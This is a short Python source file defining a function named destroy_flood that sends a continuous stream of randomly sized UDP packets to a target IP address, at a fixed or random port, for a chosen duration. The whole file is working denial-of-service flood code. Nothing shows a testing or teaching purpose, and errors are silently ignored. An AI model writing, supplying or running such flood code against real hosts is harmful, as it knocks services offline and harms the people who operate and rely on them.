import socket
import random
import time

def destroy_flood(ip, port, duration, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            if stop_event.is_set():
                break
            psize = random.randint(64, 1024)
            pport = port if port else random.randint(1, 65500)
            payload = bytes("flood", "utf-8") * (psize // len("flood"))
            sock.sendto(payload, (ip, pport))
    except:
        pass
    finally:
        sock.close()
      
